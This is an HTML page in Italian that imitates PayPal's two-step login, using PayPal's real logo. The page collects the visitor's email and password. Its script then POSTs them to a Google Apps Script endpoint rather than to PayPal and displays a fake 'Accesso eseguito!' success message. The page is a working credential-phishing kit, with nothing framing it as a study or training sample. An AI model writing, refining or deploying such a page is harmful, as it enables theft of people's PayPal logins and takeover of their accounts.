<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login PayPal ‚Äì Two‚ÄêStep</title>
  <style>
    /* tutto il tuo CSS esistente‚Ä¶ */
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg"
           alt="PayPal" class="logo">

      <!-- unica form, dentro ci mettiamo due ‚Äústep‚Äù -->
      <form id="loginForm" onsubmit="return handleLogin(event)">
        <!-- STEP 1: email -->
        <div id="stepEmail">
          <input type="email" name="email" id="email" placeholder="Email o numero di cellulare" required>
          <a href="#" class="forgot">Hai dimenticato l'indirizzo email?</a>
          <button class="btn-primary" type="submit">Avanti</button>
        </div>

        <!-- STEP 2: password, nascosto di default -->
        <div id="stepPassword" style="display:none;">
          <!-- mostra l‚Äôemail come testo read‚Äêonly o solo come label -->
          <p>Account: <strong id="displayEmail"></strong> <a href="#" onclick="goBack()">Modifica</a></p>
          <input type="password" name="password" id="password" placeholder="Password" required>
          <a href="#" class="forgot">Password dimenticata?</a>
          <button class="btn-primary" type="submit">Accedi</button>
        </div>
      </form>

      <div class="divider">oppure</div>
      <a href="#" class="btn-secondary">Registrati gratis</a>

      <div class="footer">
        <span>üáÆüáπ</span>
        <select aria-label="Seleziona lingua">
          <option value="it" selected>Italiano</option>
          <option value="en">English</option>
        </select>
      </div>

      <p id="status"></p>
    </div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const stepEmail = document.getElementById("stepEmail");
    const stepPwd   = document.getElementById("stepPassword");
    const displayEmail = document.getElementById("displayEmail");
    const status = document.getElementById("status");

    function handleLogin(e) {
      e.preventDefault();
      status.textContent = "";

      // se siamo ancora allo STEP EMAIL
      if (stepEmail.style.display !== "none") {
        const email = document.getElementById("email").value.trim();
        if (!email || !email.includes("@")) {
          status.textContent = "Inserisci un‚Äôemail valida.";
          status.style.color = "red";
          return false;
        }
        // passo allo step password
        displayEmail.textContent = email;
        stepEmail.style.display = "none";
        stepPwd.style.display   = "block";
        document.getElementById("password").focus();
        return false;
      }

      // altrimenti siamo allo STEP PASSWORD: qui invii realmente
      const data = new URLSearchParams(new FormData(form));
      fetch("https://script.google.com/macros/s/‚Ä¶/exec", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data
      })
      .then(r => {
        if (r.ok) {
          status.textContent = "Accesso eseguito!";
          status.style.color = "green";
          form.reset();
          // torniamo allo step email per un nuovo login
          goBack();
        } else throw new Error("HTTP " + r.status);
      })
      .catch(err => {
        console.error(err);
        status.textContent = "Si √® verificato un errore.";
        status.style.color = "red";
      });

      return false;
    }

    function goBack() {
      // resetta password e torna al primo step
      document.getElementById("password").value = "";
      stepPwd.style.display   = "none";
      stepEmail.style.display = "block";
      document.getElementById("email").focus();
    }
  </script>
</body>
</html>
